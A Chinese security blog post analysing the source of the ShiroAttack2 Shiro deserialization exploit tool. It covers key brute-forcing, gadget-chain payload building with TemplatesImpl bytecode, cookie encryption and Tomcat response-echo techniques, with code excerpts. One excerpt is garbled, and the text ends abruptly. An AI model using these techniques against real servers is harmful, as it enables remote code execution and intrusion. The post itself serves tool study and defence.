author:藏青@雁行安全团队
## 前言
最近想要针对Shiro的利用工具扩展利用链，但自己完全写一个工具即麻烦也没有必要，因此想要通过`SummerSec`师傅开源的工具[
**ShiroAttack2**](https://github.com/SummerSec/ShiroAttack2)扩展来实现，既然要扩展首先就得了解项目的源码实现。本片文章中我不会通篇的对这个项目代码进行分析，只抽出几个我认为的要点进行分析。
## 源码分析
### 密钥验证
在这款工具中，密钥验证主要是分为两种情况，一种是用户指定密钥，一种是未指定密钥时爆破密钥。无论是使用哪种方式来验证key都需要调用`checkIsShiro`方法判断是否为shiro。
    //指定key 
    @FXML
        void crackSpcKeyBtn(ActionEvent event) {
            this.initAttack();
            if (this.attackService.checkIsShiro()) {
                String spcShiroKey = this.shiroKey.getText();
                if (!spcShiroKey.equals("")) {
                    this.attackService.simpleKeyCrack(spcShiroKey);
                } else {
                    this.logTextArea.appendText(Utils.log("请输入指定密钥"));
                }
            }
        }
    //爆破key
        @FXML
        void crackKeyBtn(ActionEvent event) {
            this.initAttack();
            if (this.attackService.checkIsShiro()) {
                this.attackService.keysCrack();
            }
        }
`checkIsShiro`首先指定`remeberMe=1`通过返回结果是否包含`deleteMe`来判断是否为shiro框架。如果返回结果没有`deleteMe`则生成一个10位的随机数作为`remeberMe`的内容再去请求。这里之所以要生成一个位随机数我推测可能是防止WAF将`remeberMe=1`当作特征拦了。但是我这里还是想到了一种拦截思路，如果检测到`rememberMe=1`  
WAF直接阻断请求，那`result`的返回内容就会是`null`，在`result.contains("=deleteMe")`中就会触发异常，导致直接进入`catch`代码块，  
**那样工具就无法检测是否为Shiro，后面的漏洞利用功能也会失效。**
    public boolean checkIsShiro() {
            boolean flag = false;
            try {
                HashMap header = new HashMap();
                //指定remeberMe=1
                header.put("Cookie", this.shiroKeyWord + "=1");
                String result = this.headerHttpRequest(header);
                flag = result.contains("=deleteMe");
                if (flag) {
                    this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
                    flag = true;
                } else {
                    HashMap header1 = new HashMap();
                    //生成10位随机数判断
                    header1.put("Cookie", this.shiroKeyWord + "=" + AttackService.getRandomString(10));
                    String result1 = this.headerHttpRequest(header1);
                    flag = result1.contains("=deleteMe");
                    if(flag){
                        this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
                        flag = true;
                    }else {
                        this.mainController.logTextArea.appendText(Utils.log("未发现shiro框架！"));
                    }
                }
            } catch (Exception var4) {
                if (var4.getMessage() != null) {
                    this.mainController.logTextArea.appendText(Utils.log(var4.getMessage()));
                }
            }
            return flag;
        }
### 利用链爆破
无论使用什么利用链都需要和回显的方式配合，所以这里首先是拿出了利用链和回显方式并进行组合。组合后通过`:`分割，通过`gadgetCrack`检测这种利用链和回显方式是否存在。目前这款工具主要的利用链是CC利用链和Beanutils利用链。回显方式主要是`Tomcat`和`Spring`回显，作者后来版本也加了`通用回显`，这些回显方式之后我会分析。
    void crackGadgetBtn(ActionEvent event) {
            String spcShiroKey = this.shiroKey.getText();
            if (this.attackService == null) {
                this.initAttack();
            }
            boolean flag = false;
            if (!spcShiroKey.equals("")) {
                //获取利用链和回显方式并进行组合
                List targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
                for(int i = 0; i  gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
                ObjectPayload gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
                //根据回显方式创建TemplatesImpl对象
                Object template = Gadgets.createTemplatesImpl(echoOpt);
                //创建恶意对象
                Object chainObject = gadgetPayload.getObject(template);
                //生成的恶意对象AES加密后返回
                rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
            } catch (Exception var9) {
    //            var9.printStackTrace();
                this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
            }
            return rememberMe;
        }
**获取利用链的Class对象并实例化**
根据类名获取对应的Class对象
    public interface ObjectPayload { T getObject(Object paramObject) throws Exception;
        public static class Utils {
            public static Class getPayloadClass(String className) {
                Class clazz = null;
                try {
                    //根据类名获取Class对象
                    clazz = (Class)Class.forName("com.summersec.attack.deser.payloads." + StringUtils.capitalize(className));
                } catch (Exception exception) {}
                return clazz;
            }
        }
    }
**根据回显方式创建TemplatesImpl对象**
通过Javasist生成回显类并转换为字节码赋值给`_bytecodes`属性。
    public static  T createTemplatesImpl(String payload, Class tplClass, Class abstTranslet) throws Exception {
            T templates = tplClass.newInstance();
            ClassPool pool = ClassPool.getDefault();
            //根据名称通过forName加载回显的类
            Class echoClazz = Utils.getPayloadClass(payload);
            EchoPayload echoObj = (EchoPayload)echoClazz.newInstance();
            //通过Javasist动态生成回显类
            CtClass clazz = echoObj.genPayload(pool);
            CtClass superClass = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superClass);
            byte[] classBytes = clazz.toBytecode();
            //将生成的回显类字节码赋值给_bytecodes属性
            Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
            bcField.setAccessible(true);
            bcField.set(templates, new byte[][]{classBytes});
            Field nameField = TemplatesImpl.class.getDeclaredField("_name");
            nameField.setAccessible(true);
            nameField.set(templates, "a");
            return templates;
        }
**通过getObject获取恶意对象**
通过getObject方法获取恶意对象，在这个工具里使用的利用链主要为CC链和`Beanutils`链。
**AES加密构建好的恶意对象**
由于Shiro在高版本中更换了GCM加密方式，因此根据版本的不同选择不同的加密算法。
    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
            byte[] serpayload = SerializableUtils.toByteArray(chainObject);
            byte[] bkey = DatatypeConverter.parseBase64Binary(key);
            byte[] encryptpayload = null;
            //根据版本不同使用不同的加密算法
            if (AttackService.aesGcmCipherType == 1) {
                GcmEncrypt gcmEncrypt = new GcmEncrypt();
                String byteSource = gcmEncrypt.encrypt(key,serpayload);
                System.out.println(shiroKeyWord + "=" + byteSource);
                return shiroKeyWord + "=" + byteSource;
            } else {
                encryptpayload = AesUtil.encrypt(serpayload, bkey);
            }
            return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
        }
关于利用链这里我想多提一些内容，因为本来分析这款工具的原理就是为了扩展利用链。通过上面的分析可以看到作者做了一个抽象，`getObject`传入的对象是构建好的`TemplateImpl`对象，所以这也是作者实现的利用链不多的原因，因为不是所有的利用链封装的都是`TemplateImpl`对象，而且也有很多利用方式无法回显利用。
### 回显方式分析
#### Tomcat
Tomcat的回显主要的思路都是获取Response对象，并向Response中写入执行结果来实现，下面我对多种Tomcat回显的方式做一个简要总结。
  * `ApplicationFilterChain#lastServicedResponse`中记录了response的内容，所以可以通过获取`lastServicedResponse`来获取Response对象并进行写入。使用这种方式需要请求两次，因为在默认情况下`lastServicedResponse`中并不会记录`response`，所以第一次请求需要修改一个属性值让`lastServicedResponse`记录`response`。但是这种方式不能用在Shiro反序列化中回显，因为Shiro的反序列化发生在`lastServicedResponse`缓存Response之前，所以我们无法在反序列化的过程中拿到缓存中的Response对象。
  * `AbstractProcessor#response`中存储了Response对象，可以通过获取这个属性值获取response对象。这种方式是通过`Thread.currentThread.getContextClassLoader()`获取`webappClassLoader`，再获取到Context最后一层层反射获取Response对象。这种方式的主要问题是代码量过多，在Shiro的利用中可能由于请求头过大导致利用失败。虽然可以通过在RemeberMe中只实现一个ClassLoader加载Body中的Class这种方式绕过。但是这样设计可能会导致和其他回显的利用方式有些差别，导致代码无法复用，所以我猜测这也是作者没有使用这种方式回显的原因。
  * 首先通过`Thread.currentThread().getThreadGroup()`获取线程数组，从线程数组中找到包含`http`但不包含`exec`的线程。从保存的`NioEndPoint`中拿到`ConnectionHandler`，再从Handler中拿到`RequestInfo`对象，最后从`RequestInfo`中拿到Response。
最后一种方式是这款工具使用的方式，虽然这种获取方式比较简洁，但是好像没有师傅给出为什么要这么获取的原因，下面我尝试对这种利用方式做出解释。
首先我们要知道，这种方式实际上是从`ClientPoller`线程中取出的`NioEndPoint`对象，并拿到`RequestInfo`对象。
**为什么从**`**ClientPoller**` **中可以拿到**`**NioEndPoint**` **对象？**
ClientPoller对象是在`NioEndPoint#startInternal`时创建的，在创建`ClientPoller`线程时传入了`poller`对象作为target属性，因此可以从`ClientPoller->target`中拿到poller对象，而`Poller`又是`NioEndpoint`的内部类，所以其`this$0`持有外部类`NioEndPoint`的引用。因此从`ClientPoller`线程中获取到`NioEndPoint`对象。
    @Override
        public void startInternal() throws Exception {
    ...
                initializeConnectionLatch();
                // Start poller thread
                poller = new Poller();
                Thread pollerThread = new Thread(poller, getName() + "-ClientPoller");
                pollerThread.setPriority(threadPriority);
                pollerThread.setDaemon(true);
                pollerThread.start();
                startAcceptorThread();
            }
        }
另外`Acceptor`中也持有`NioEndpoint`对象，因此也可以获取到`RequestInfo`对象。
**为什么要通过for循环进行遍历Thread？**
虽然上面我们看到`ClientPoller`线程只有一个，但是作者在实现工具的时候却使用了for循环遍历，这是为什么？
    Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int var6 = 0; var6 < var5.length; ++var6) {
                Thread var7 = var5[var6];
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                ...
我当前的环境是`springboot`中内置的`tomcat`,但是打开自己下载的`tomcat`发现其实创建的`ClientPoller`不一定只有一个,查阅资料默认配置下`ClientPoller`的个数是CPU的核数。
    pollers = new Poller[getPollerThreadCount()];
                for (int i=0; i<pollers.length; i++) {
                    pollers[i] = new Poller();
                    Thread pollerThread = new Thread(pollers[i], getName() + "-ClientPoller-"+i);
                    pollerThread.setPriority(threadPriority);
                    pollerThread.setDaemon(true);
                    pollerThread.start();
                }
所以我认为这个for循环的这么写应该更合理一些